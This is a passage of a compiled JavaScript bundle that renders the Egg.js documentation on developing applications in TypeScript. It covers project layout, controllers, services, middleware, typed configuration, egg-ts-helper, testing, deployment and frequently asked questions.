superset of JavaScript that compiles to plain JavaScript.")),r.a.createElement("p",null,"For a large number of enterprises' applications, TypeScript's static type checking, intellisense, friendly IDE are valuable. For more please see ",r.a.createElement(l["Link"],{to:"https://juejin.im/post/59c46bc86fb9a00a4636f939"},"System Research Report For TypeScript"),"."),r.a.createElement("p",null,"However, we've met some problems influencing users' experience when developing Egg in TypeScript:"),r.a.createElement("ul",null,r.a.createElement("li",null,"The most outstanding Loader Mechanism (Auto-loading) makes TS not analyze dependencies in static."),r.a.createElement("li",null,"How to validate and show intellisense in ",r.a.createElement("code",null,"config.","{","env","}",".js"),", when we modify settings by plugin and these configurations are automatically merged?"),r.a.createElement("li",null,"During the period of developing, ",r.a.createElement("code",null,"tsc -w")," is created as an independent process to build up codes, it makes us entangled about where to save the temporary files, and the complicated ",r.a.createElement("code",null,"npm scripts"),"."),r.a.createElement("li",null,"How to map to the TS source files instead of compiled js files in unit tests, coverage tests and error stacks online?")),r.a.createElement("p",null,"This article mainly describes:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("strong",null,"Developing principles of TS for the application layer.")),r.a.createElement("li",null,r.a.createElement("strong",null,"How do we solve the problem for developers with the help of the tool chain so that they have no scene about it and keep in consistency"))),r.a.createElement("p",null,"For more about this tossing process, please see ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues/2272"},"[RFC] TypeScript tool support"),"."),r.a.createElement("hr",null),r.a.createElement("h2",{id:"quick-start"},r.a.createElement(l["AnchorLink"],{to:"#quick-start","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Quick Start"),r.a.createElement("p",null,"A quick initialization through the boilerplate:"),r.a.createElement(o["a"],{code:"$ mkdir showcase && cd showcase\n$ npm init egg --type=ts\n$ npm i\n$ npm run dev",lang:"bash"}),r.a.createElement("p",null,"The boilerplate above will create a very simple example, for a detailed one please see ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/hackernews-async-ts"},"eggjs/examples/hackernews-async-ts")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/227713/38358019-bf7890fa-38f6-11e8-8955-ea072ac6dc8c.gif",alt:"tegg.gif"})),r.a.createElement("hr",null),r.a.createElement("h2",{id:"principles-of-catalogs"},r.a.createElement(l["AnchorLink"],{to:"#principles-of-catalogs","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Principles of Catalogs"),r.a.createElement("p",null,r.a.createElement("strong",null,"Some constraints:")),r.a.createElement("ul",null,r.a.createElement("li",null,"We've no plans for re-writing Egg in TS yet."),r.a.createElement("li",null,"Egg itself, with its plugin, will have corresponding ",r.a.createElement("code",null,"index.d.ts")," for users to use easily."),r.a.createElement("li",null,"TypeScript only belongs to a communication practice. We support it to some extent with our tool chain."),r.a.createElement("li",null,"TypeScript's version MUST BE 2.8 at least.")),r.a.createElement("p",null,"There's no obvious difference between TS's project and Egg's in js:"),r.a.createElement("ul",null,r.a.createElement("li",null,"The suffix is ",r.a.createElement("code",null,"ts")," in ",r.a.createElement("code",null,"typescript")," style"),r.a.createElement("li",null,r.a.createElement("code",null,"typings")," folder is used to put ",r.a.createElement("code",null,"d.ts")," files (most of them are automatically created)")),r.a.createElement(o["a"],{code:"showcase\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 controller\n\u2502   \u2502   \u2514\u2500\u2500 home.ts\n\u2502   \u251c\u2500\u2500 service\n\u2502   \u2502   \u2514\u2500\u2500 news.ts\n\u2502   \u2514\u2500\u2500 router.ts\n\u251c\u2500\u2500 config\n\u2502   \u251c\u2500\u2500 config.default.ts\n\u2502   \u251c\u2500\u2500 config.local.ts\n\u2502   \u251c\u2500\u2500 config.prod.ts\n\u2502   \u2514\u2500\u2500 plugin.ts\n\u251c\u2500\u2500 test\n\u2502   \u2514\u2500\u2500 **/*.test.ts\n\u251c\u2500\u2500 typings\n\u2502   \u2514\u2500\u2500 **/*.d.ts\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 tsconfig.json\n\u2514\u2500\u2500 tslint.json",lang:"bash"}),r.a.createElement("h3",{id:"controller"},r.a.createElement(l["AnchorLink"],{to:"#controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller"),r.a.createElement(o["a"],{code:"// app/controller/home.ts\nimport { Controller } from 'egg';\n\nexport default class HomeController extends Controller {\n  public async index() {\n    const { ctx, service } = this;\n    const page = ctx.query.page;\n    const result = await service.news.list(page);\n    await ctx.render('home.tpl', result);\n  }\n}",lang:"typescript"}),r.a.createElement("h3",{id:"router"},r.a.createElement(l["AnchorLink"],{to:"#router","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router"),r.a.createElement(o["a"],{code:"// app/router.ts\nimport { Application } from 'egg';\n\nexport default (app: Application) => {\n  const { router, controller } = app;\n  router.get('/', controller.home.index);\n};",lang:"typescript"}),r.a.createElement("h3",{id:"service"},r.a.createElement(l["AnchorLink"],{to:"#service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service"),r.a.createElement(o["a"],{code:"// app/service/news.ts\nimport { Service } from 'egg';\n\nexport default class NewsService extends Service {\n  public async list(page?: number): Promise<NewsItem[]> {\n    return [];\n  }\n}\n\nexport interface NewsItem {\n  id: number;\n  title: string;\n}",lang:"typescript"}),r.a.createElement("h3",{id:"middleware"},r.a.createElement(l["AnchorLink"],{to:"#middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Middleware"),r.a.createElement(o["a"],{code:"// app/middleware/robot.ts\n\nimport { Context } from 'egg';\n\n// Your own middleware here\nexport default function fooMiddleware() {\n  return async (ctx: Context, next: any) => {\n    // Get configs like this\uff1a\n    // const config = ctx.app.config;\n    // config.xxx....\n    await next();\n  };\n}",lang:"typescript"}),r.a.createElement("p",null,"When some property's name in config matches your middleware files's, Egg will automatically read out all of its sub properties."),r.a.createElement("p",null,"Let's assume you've got a middleware named ",r.a.createElement("code",null,"uuid"),", and its config.default.js is:"),r.a.createElement(o["a"],{code:"'use strict';\n\nimport { EggAppConfig, PowerPartial } from 'egg';\n\nexport default function(appInfo: EggAppConfig) {\n  const config = {} as PowerPartial<EggAppConfig>;\n\n  config.keys = appInfo.name + '123123';\n\n  config.middleware = ['uuid'];\n\n  config.security = {\n    csrf: {\n      ignore: '123',\n    },\n  };\n\n  const bizConfig = {\n    local: {\n      msg: 'local',\n    },\n\n    uuid: {\n      name: 'ebuuid',\n      maxAge: 1000 * 60 * 60 * 24 * 365 * 10,\n    },\n  };\n\n  return {\n    ...config,\n    ...bizConfig,\n  };\n}",lang:"javascript"}),r.a.createElement("p",null,"In ",r.a.createElement("code",null,"uuid")," middleware:"),r.a.createElement(o["a"],{code:"// app/middleware/uuid.ts\n\nimport { Context, Application, EggAppConfig } from 'egg';\n\nexport default function uuid(\n  options: EggAppConfig['uuid'],\n  app: Application,\n): any {\n  return async (ctx: Context, next: () => Promise<any>) => {\n    // The 'name' is just the sub prop in uuid in the config.default.js\n    console.info(options.name);\n    await next();\n  };\n}",lang:"typescript"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Notice: The return value of any middleware must be ",r.a.createElement("code",null,"any")," now, otherwise there's a compiling error about the compatibility of context between Koa's context in route.get/all and Egg's Context.")),r.a.createElement("h3",{id:"extend"},r.a.createElement(l["AnchorLink"],{to:"#extend","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend"),r.a.createElement(o["a"],{code:"// app/extend/context.ts\nimport { Context } from 'egg';\n\nexport default {\n  isAjax(this: Context) {\n    return this.get('X-Requested-With') === 'XMLHttpRequest';\n  },\n};\n\n// app.ts\nexport default (app) => {\n  app.beforeStart(async () => {\n    await Promise.resolve('egg + ts');\n  });\n};",lang:"typescript"}),r.a.createElement("h3",{id:"config"},r.a.createElement(l["AnchorLink"],{to:"#config","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Config"),r.a.createElement("p",null,"Config is a little complicated, because it supports:"),r.a.createElement("ul",null,r.a.createElement("li",null,'In Controller and Service, we need "multi-layer" intellisense configurations, they are automatically related to each other.'),r.a.createElement("li",null,"In Config, ",r.a.createElement("code",null,"config.view = ","{","}")," will also support intellisense."),r.a.createElement("li",null,"In ",r.a.createElement("code",null,"config.","{","env","}",".ts"),", we can use customized configuration settings with intellisense in ",r.a.createElement("code",null,"config.default.ts"),".")),r.a.createElement(o["a"],{code:"// app/config/config.default.ts\nimport { EggAppInfo, EggAppConfig, PowerPartial } from 'egg';\n\nexport default (appInfo: EggAppInfo) => {\n  const config = {} as PowerPartial<EggAppConfig>;\n\n  // Override the configs of framework and plugins\n  config.keys = appInfo.name + '123456';\n  config.view = {\n    defaultViewEngine: 'nunjucks',\n    mapping: {\n      '.tpl': 'nunjucks',\n    },\n  };\n\n  // Configs of application\n  const bizConfig = {};\n  bizConfig.news = {\n    pageSize: 30,\n    serverUrl: 'https://hacker-news.firebaseio.com/v0',\n  };\n\n  // We merge the business logic's configs into AppConfig as the return value\n  return {\n    // If we directly return you config and merge it into EggAppConfig, there'll be a circulate type error\n    ...(config as {}),\n    ...bizConfig,\n  };\n};",lang:"typescript"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Notice: We need ",r.a.createElement("code",null,"egg-ts-helper")," to merge the returned config type from ",r.a.createElement("code",null,"config.default.js")," into egg's ",r.a.createElement("code",null,"EggAppConfig"),".")),r.a.createElement("p",null,"When ",r.a.createElement("code",null,"EggAppConfig")," is merged with the returned type of ",r.a.createElement("code",null,"config.default.ts"),", we can also get the intellisenses of our customized configs in ",r.a.createElement("code",null,"config.default.ts")," like this following:"),r.a.createElement(o["a"],{code:"// app/config/config.local.ts\nimport { EggAppConfig } from 'egg';\n\nexport default () => {\n  const config = {} as PowerPartial<EggAppConfig>;\n  // Now we can get the intellisenses of 'news'\n  config.news = {\n    pageSize: 20,\n  };\n  return config;\n};",lang:"typescript"}),r.a.createElement("p",null,"Remarks:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"Conditional Types")," is the KEY to solving config's intellisense."),r.a.createElement("li",null,"Anyone if interested in this, have a look at the implement of ",r.a.createElement("code",null,"PowerPartial")," at ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/index.d.ts"},"egg/index.d.ts"),".")),r.a.createElement(o["a"],{code:"// {egg}/index.d.ts\ntype PowerPartial<T> = {\n  [U in keyof T]?: T[U] extends {} ? PowerPartial<T[U]> : T[U];\n};",lang:"typescript"}),r.a.createElement("h3",{id:"plugin"},r.a.createElement(l["AnchorLink"],{to:"#plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin"),r.a.createElement(o["a"],{code:"// config/plugin.ts\nimport { EggPlugin } from 'egg';\n\nconst plugin: EggPlugin = {\n  static: true,\n  nunjucks: {\n    enable: true,\n    package: 'egg-view-nunjucks',\n  },\n};\n\nexport default plugin;",lang:"javascript"}),r.a.createElement("h3",{id:"lifecycle"},r.a.createElement(l["AnchorLink"],{to:"#lifecycle","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Lifecycle"),r.a.createElement(o["a"],{code:"// app.ts\nimport { Application, IBoot } from 'egg';\n\nexport default class FooBoot implements IBoot {\n  private readonly app: Application;\n\n  constructor(app: Application) {\n    this.app = app;\n  }\n\n  configWillLoad() {\n    // Ready to call configDidLoad,\n    // Config, plugin files are referred,\n    // this is the last chance to modify the config.\n  }\n\n  configDidLoad() {\n    // Config, plugin files have loaded.\n  }\n\n  async didLoad() {\n    // All files have loaded, start plugin here.\n  }\n\n  async willReady() {\n    // All plugins have started, can do some thing before app ready.\n  }\n\n  async didReady() {\n    // Worker is ready, can do some things\n    // don't need to block the app boot.\n  }\n\n  async serverDidReady() {\n    // Server is listening.\n  }\n\n  async beforeClose() {\n    // Do some thing before app close.\n  }\n}",lang:"typescript"}),r.a.createElement("h3",{id:"typings"},r.a.createElement(l["AnchorLink"],{to:"#typings","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Typings"),r.a.createElement("p",null,"The folder is the principle of TS, where ",r.a.createElement("code",null,"**/*.d.ts")," are automatically recognized."),r.a.createElement("ul",null,r.a.createElement("li",null,"Put developers' hand-writing suggestions in ",r.a.createElement("code",null,"typings/index.d.ts"),"."),r.a.createElement("li",null,"Tools will automatically generate ",r.a.createElement("code",null,"typings/","{","app,config","}","/**.d.ts"),". Please DO NOT change manually (See below).")),r.a.createElement("hr",null),r.a.createElement("h2",{id:"developing-period"},r.a.createElement(l["AnchorLink"],{to:"#developing-period","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Developing period"),r.a.createElement("h3",{id:"ts-node"},r.a.createElement(l["AnchorLink"],{to:"#ts-node","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ts-node"),r.a.createElement("p",null,r.a.createElement("code",null,"egg-bin")," has built ",r.a.createElement(l["Link"],{to:"https://github.com/TypeStrong/ts-node"},"ts-node")," in, and ",r.a.createElement("code",null,"egg loader")," will automatically load ",r.a.createElement("code",null,"*.ts")," and compile them in memory during the period of development."),r.a.createElement("p",null,"Now ",r.a.createElement("code",null,"dev")," / ",r.a.createElement("code",null,"debug")," / ",r.a.createElement("code",null,"test")," / ",r.a.createElement("code",null,"cov")," are supported."),r.a.createElement("p",null,"Developers only need to config in ",r.a.createElement("code",null,"package.json")," simply:"),r.a.createElement(o["a"],{code:'{\n  "name": "showcase",\n  "egg": {\n    "typescript": true\n  }\n}',lang:"json"}),r.a.createElement("h3",{id:"egg-ts-helper"},r.a.createElement(l["AnchorLink"],{to:"#egg-ts-helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"egg-ts-helper"),r.a.createElement("p",null,"Due to the automatic loading mechanism, TS cannot analyze dependencies in static or relationship intellisense."),r.a.createElement("p",null,"Luckily, TS has many tricks to cope with it. We can use ",r.a.createElement(l["Link"],{to:"https://www.typescriptlang.org/docs/handbook/declaration-merging.html"},"Declaration Merging")," to write ",r.a.createElement("code",null,"d.ts")," as a helper."),r.a.createElement("p",null,"E.g: ",r.a.createElement("code",null,"app/service/news.ts")," will automatically load ",r.a.createElement("code",null,"ctx.service.news")," and recognize it, if you write like this below:"),r.a.createElement(o["a"],{code:"// typings/app/service/index.d.ts\nimport News from '../../../app/service/News';\n\ndeclare module 'egg' {\n  interface IService {\n    news: News;\n  }\n}",lang:"typescript"}),r.a.createElement("p",null,"It's a bit too bothering to write them manually, so we offer you a tool ",r.a.createElement(l["Link"],{to:"https://github.com/whxaxes/egg-ts-helper"},"egg-ts-helper"),", with which we can analyze and generate ",r.a.createElement("code",null,"d.ts")," files automatically."),r.a.createElement("p",null,"What we do is just to do some configs in ",r.a.createElement("code",null,"package.json"),":"),r.a.createElement(o["a"],{code:'{\n  "egg": {\n    "declarations": true\n  },\n  "scripts": {\n    "dev": "egg-bin dev",\n    "test-local": "egg-bin test",\n    "clean": "ets clean"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"The corresponding ",r.a.createElement("code",null,"d.ts")," files are automatically generated in ",r.a.createElement("code",null,"typings/","{","app,config","}","/")," during the developing period. ",r.a.createElement("strong",null,"DO NOT modify manually in case of being overwritten"),"."),r.a.createElement("p",null,"The tool nowadays can support egg projects in ts and js with intellisenses."),r.a.createElement("h3",{id:"unit-test-and-cov"},r.a.createElement(l["AnchorLink"],{to:"#unit-test-and-cov","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Unit Test and Cov"),r.a.createElement("p",null,"Unit Test is a MUST in development:"),r.a.createElement(o["a"],{code:"// test/app/service/news.test.ts\nimport assert from 'assert';\nimport { Context } from 'egg';\nimport { app } from 'egg-mock/bootstrap';\n\ndescribe('test/app/service/news.test.js', () => {\n  let ctx: Context;\n\n  before(async () => {\n    ctx = app.mockContext();\n  });\n\n  it('list()', async () => {\n    const list = await ctx.service.news.list();\n    assert(list.length === 30);\n  });\n});",lang:"typescript"}),r.a.createElement("p",null,"Run commands as what you do before, and we've built ",r.a.createElement("code",null,"Error stacks and coverages")," in."),r.a.createElement(o["a"],{code:'{\n  "name": "showcase",\n  "egg": {\n    "declarations": true\n  },\n  "scripts": {\n    "test": "npm run lint -- --fix && npm run test-local",\n    "test-local": "egg-bin test",\n    "cov": "egg-bin cov",\n    "lint": "tslint ."\n  }\n}',lang:"json"}),r.a.createElement("h3",{id:"debug"},r.a.createElement(l["AnchorLink"],{to:"#debug","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Debug"),r.a.createElement("p",null,"There's no main difference for debugging in TS, it can reach correct positions through ",r.a.createElement("code",null,"sourcemap"),"."),r.a.createElement(o["a"],{code:'{\n  "name": "showcase",\n  "egg": {\n    "declarations": true\n  },\n  "scripts": {\n    "debug": "egg-bin debug",\n    "debug-test": "npm run test-local -- --inspect"\n  }\n}',lang:"json"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://eggjs.org/zh-cn/core/development.html#%E4%BD%BF%E7%94%A8-vscode-%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"},"Debugging in VSCode")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/atian25/blog/issues/25"},"History of Debugging Egg in VSCode"))),r.a.createElement("hr",null),r.a.createElement("h2",{id:"deployment"},r.a.createElement(l["AnchorLink"],{to:"#deployment","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Deployment"),r.a.createElement("h3",{id:"building"},r.a.createElement(l["AnchorLink"],{to:"#building","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Building"),r.a.createElement("ul",null,r.a.createElement("li",null,"In a PROD env, we tend to build ts to js, and recommend to build on ",r.a.createElement("code",null,"ci")," and make packages.")),r.a.createElement("p",null,"Configs in ",r.a.createElement("code",null,"package.json")," :"),r.a.createElement(o["a"],{code:'{\n  "devDependencies": {\n    "@eggjs/tsconfig": "^1.0.0"\n  },\n  "egg": {\n    "typescript": true,\n    "declarations": true\n  },\n  "scripts": {\n    "start": "egg-scripts start --title=egg-server-showcase",\n    "stop": "egg-scripts stop --title=egg-server-showcase",\n    "tsc": "ets && tsc -p tsconfig.json",\n    "ci": "npm run lint && npm run cov && npm run tsc",\n    "clean": "ets clean"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"And the corresponding ",r.a.createElement("code",null,"tsconfig.json"),":"),r.a.createElement(o["a"],{code:'{\n  "extends": "@eggjs/tsconfig",\n  "exclude": ["app/public", "app/web", "app/views"]\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Notice: When ts and js files are with the same name, egg will first load js ones. So during the development period, ",r.a.createElement("code",null,"egg-ts-helper")," will be automatically called to clear up all the js files with the same names, of course you can use ",r.a.createElement("code",null,"npm run clean")," to clear them manually.")),r.a.createElement("h3",{id:"error-stacks"},r.a.createElement(l["AnchorLink"],{to:"#error-stacks","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Error Stacks"),r.a.createElement("p",null,"Codes online are js after compilation, however what we expect is to see error stacks pointing at TS source codes. So:"),r.a.createElement("ul",null,r.a.createElement("li",null,"When buiding the project, we should insert info of ",r.a.createElement("code",null,"sourcemap")," in ",r.a.createElement("code",null,"inlineSourceMap: true"),"."),r.a.createElement("li",null,"For developers, there's no need to worry about correcting the positions to the right error stacks in a built-in ",r.a.createElement("code",null,"egg-scripts"),".")),r.a.createElement("p",null,"For more detailed info:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://zhuanlan.zhihu.com/p/26267678"},"https://zhuanlan.zhihu.com/p/26267678")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts/pull/19"},"https://github.com/eggjs/egg-scripts/pull/19"))),r.a.createElement("hr",null),r.a.createElement("h2",{id:"guides-to-the-developments-of-pluginframework"},r.a.createElement(l["AnchorLink"],{to:"#guides-to-the-developments-of-pluginframework","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Guides to the Developments of Plugin/Framework"),r.a.createElement("p",null,r.a.createElement("strong",null,"Principles:")),r.a.createElement("ul",null,r.a.createElement("li",null,"DO NOT recommend to develop plugin/framework in TS directly, we should publish them in js to npm."),r.a.createElement("li",null,"When you write a plugin/framework, the corresponding ",r.a.createElement("code",null,"index.d.ts")," should be included."),r.a.createElement("li",null,"By ",r.a.createElement(l["Link"],{to:"https://www.typescriptlang.org/docs/handbook/declaration-merging.html"},"Declaration Merging")," we can inject the functions of plugin/framework into Egg."),r.a.createElement("li",null,"All are mounted on ",r.a.createElement("code",null,"egg")," module, DO NOT use the outer layer.")),r.a.createElement("h3",{id:"plugin-1"},r.a.createElement(l["AnchorLink"],{to:"#plugin-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin"),r.a.createElement("p",null,"Styles can be referred from the automatically generated ",r.a.createElement("code",null,"egg-ts-helper"),":"),r.a.createElement(o["a"],{code:"// {plugin_root}/index.d.ts\n\nimport 'egg';\nimport News from '../../../app/service/News';\n\ndeclare module 'egg' {\n  // extended service\n  interface IService {\n    news: News;\n  }\n\n  // extended app\n  interface Application {}\n\n  // extended context\n  interface Context {}\n\n  // extended your own configs\n  interface EggAppConfig {}\n\n  // extend customize env\n  type EggEnvType = 'local' | 'unittest' | 'prod' | 'sit';\n}",lang:"typescript"}),r.a.createElement("h3",{id:"the-outer-framework"},r.a.createElement(l["AnchorLink"],{to:"#the-outer-framework","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"The Outer Framework"),r.a.createElement("p",null,"Definitions:"),r.a.createElement(o["a"],{code:"// {framework_root}/index.d.ts\n\nimport * as Egg from 'egg';\n\n// With 'import' to include the outer framework's plugin.\nimport 'my-plugin';\n\ndeclare module 'egg' {\n  // Extend egg like plugin...\n}\n\n// Export the whole Egg\nexport = Egg;",lang:"typescript"}),r.a.createElement("p",null,"For developers, they can directly import your framework:"),r.a.createElement(o["a"],{code:"// app/service/news.ts\n\n// Developers can get all intellisense after they import your framework\nimport { Service } from 'duck-egg';\n\nexport default class NewsService extends Service {\n  public async list(page?: number): Promise<NewsItem[]> {\n    return [];\n  }\n}",lang:"typescript"}),r.a.createElement("h2",{id:"frequently-asked-questions"},r.a.createElement(l["AnchorLink"],{to:"#frequently-asked-questions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Frequently-asked questions"),r.a.createElement("p",null,"Here're some questions asked by many people with answers one by one:"),r.a.createElement("h3",{id:"ts-wont-be-loaded-when-running-npm-start"},r.a.createElement(l["AnchorLink"],{to:"#ts-wont-be-loaded-when-running-npm-start","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ts")," won't be loaded when running ",r.a.createElement("code",null,"npm start")),r.a.createElement("p",null,r.a.createElement("code",null,"npm start")," actually runs ",r.a.createElement("code",null,"egg-scripts start"),", however we ONLY integrate ",r.a.createElement("code",null,"ts-node")," in our ",r.a.createElement("code",null,"egg-bin"),", it means ts won'be loaded until we use ",r.a.createElement("code",null,"egg-bin"),"."),r.a.createElement("p",null,r.a.createElement("code",null,"egg-scripts")," is the cli for PROD, and we suggest you compiling all the ts to js before running because of robustness and capbility. That's the reason why we don't suggest you using ",r.a.createElement("code",null,"ts-node")," to run the application in PROD."),r.a.createElement("p",null,"On the contrary, ",r.a.createElement("code",null,"ts-node")," can reduce the cost of management for compiled files from ",r.a.createElement("code",null,"tsc"),"in DEV, and the performance loss can almost be ignored, so ",r.a.createElement("code",null,"ts-node")," is integrated into ",r.a.createElement("code",null,"egg-bin"),"."),r.a.createElement("p",null,r.a.createElement("strong",null,"In summary: Please use ",r.a.createElement("code",null,"tsc"),"to compile all ts files into js through ",r.a.createElement("code",null,"npm run tsc"),", and then run ",r.a.createElement("code",null,"npm start"),".")),r.a.createElement("h3",{id:"theres-no-loaded-objects-when-using-eggs-plugin"},r.a.createElement(l["AnchorLink"],{to:"#theres-no-loaded-objects-when-using-eggs-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"There's no loaded objects when using egg's plugin"),r.a.createElement("p",null,"There're mainly two reasons causing this problem:"),r.a.createElement("p",null,r.a.createElement("strong",null,"1. No related defination ",r.a.createElement("code",null,"d.ts")," file for the plugin")),r.a.createElement("p",null,"If you want to load some object into egg, you MUST follow the ",r.a.createElement("code",null,"Plugin / Framework Development Instructions")," below by making a declaration file into your own plugin."),r.a.createElement("p",null,"You can also create a new declaration file to solve this problem when you are eager to deploy to PROD. Suppose I'm using the plugin of ",r.a.createElement("code",null,"egg-dashboard")," and it has a loading object in egg's app without any declarations, so if you directly use ",r.a.createElement("code",null,"app.dashboard"),", there'll be a type error occuring, and you want to solve it eagerly, you can create ",r.a.createElement("code",null,"index.d.ts")," in 'typings' by writing this following:"),r.a.createElement(o["a"],{code:"// typings/index.d.ts\n\nimport 'egg';\n\ndeclare module 'egg' {\n  interface Application {\n    dashboard: any;\n  }\n}",lang:"typescript"}),r.a.createElement("p",null,"Now it's solved! Of course your PRs for plugins without declaration files are welcomed to help others!"),r.a.createElement("p",null,r.a.createElement("strong",null,"2. egg's plugin has the declaration but not loaded")),r.a.createElement("p",null,"If the egg's plugin has the right declaration, we need to import it exclipitly and ts can load the related object."),r.a.createElement("p",null,"If you use ",r.a.createElement("code",null,"egg-ts-helper"),", it will automatically generate the exclipit importing declarations according to what plugins you've enabled in the application. If you don't use that, you have to import the declaration of plugins manually."),r.a.createElement(o["a"],{code:"// typings/index.d.ts\n\nimport 'egg-dashboard';",lang:"typescript"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Notice: You MUST use 'import' in ",r.a.createElement("code",null,"d.ts"),", because most of egg's plugins are without main entry points. There'll be errors occuring if you import directly in ts.")),r.a.createElement("h3",{id:"paths-is-invalid-in-tsconfigjson"},r.a.createElement(l["AnchorLink"],{to:"#paths-is-invalid-in-tsconfigjson","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"paths")," is invalid in ",r.a.createElement("code",null,"tsconfig.json")),r.a.createElement("p",null,"Strictly speaking, this has nothing to do with egg but with many people's questions, and we'll give our answer to it. The reason is ",r.a.createElement("code",null,"tsc")," WON'T convert the import path when compiling ts to js, so when you config ",r.a.createElement("code",null,"paths")," in ",r.a.createElement("code",null,"tsconfig.json")," and if you use ",r.a.createElement("code",null,"paths")," to import the related modules, you are running the high risk that you cannot find them when compiled to js."),r.a.createElement("p",null,"The solution is either you don't use ",r.a.createElement("code",null,"paths"),", or you can ONLY import some declarations instead of detailed values. Another way is that you can use ",r.a.createElement(l["Link"],{to:"https://github.com/dividab/tsconfig-paths"},"tsconfig-paths")," to hook the process logic in node's path module to support ",r.a.createElement("code",null,"paths")," in ",r.a.createElement("code",null,"tsconfig.json"),"."),r.a.createElement("p",null,"You can directly import ",r.a.createElement("code",null,"tsconfig-paths")," in ",r.a.createElement("code",null,"config/plugin.ts"),", because ",r.a.createElement("code",null,"plugin.ts")," is ALWAYS loaded firstly in both App and Agent."),r.a.createElement(o["a"],{code:"// config/plugin.ts\n\nimport 'tsconfig-paths/register';\n\n...",lang:"typescript"}),r.a.createElement("h3",{id:"how-to-write-unit-tests-for-declarations-of-eggs-plugins"},r.a.createElement(l["AnchorLink"],{to:"#how-to-write-unit-tests-for-declarations-of-eggs-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to write unit tests for declarations of egg's plugins?"),r.a.createElement("p",null,"Many contributors don't know how to write unit tests for their plugin's declaration files, so we also have a discussion about it here:"),r.a.createElement("p",null,"When you finish writing a declaration for an egg's plugin, you can write your own application in ",r.a.createElement("code",null,"test/fixures")," (you can refer ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view/tree/master/test/fixtures/apps/ts"},"https://github.com/eggjs/egg-view/tree/master/test/fixtures/apps/ts"),"). Do remember to add ",r.a.createElement("code",null,"paths"),"configs into ",r.a.createElement("code",null,"tsconfig.json")," to do imports in the fixture. Take ",r.a.createElement("code",null,"egg-view")," as an example:"),r.a.createElement(o["a"],{code:'"paths": {\n      "egg-view": ["../../../../"]\n    }',lang:"json"}),r.a.createElement("p",null,"Do remember DO NOT CONFIG ",r.a.createElement("code",null,'"skipLibCheck": true')," in the ",r.a.createElement("code",null,"tsconfig.json"),", and if you set it to true, ",r.a.createElement("code",null,"tsc"),"will ignore the type checks when compiling, and there's no meaning for unit tests for your plugin's declarations."),r.a.createElement("p",null,"In the end, add a test case to check whether your declaration works properly or not. See ",r.a.createElement("code",null,"egg-view")," example below:"),r.a.createElement(o["a"],{code:"describe('typescript', () => {\n  it('should compile ts without error', () => {\n    return (\n      coffee\n        .fork(require.resolve('typescript/bin/tsc'), [\n          '-p',\n          path.resolve(__dirname, './fixtures/apps/ts/tsconfig.json'),\n          '--noEmit',\n        ])\n        // .debug()\n        .expect('code', 0)\n        .end()\n    );\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Some other unit test projects as your 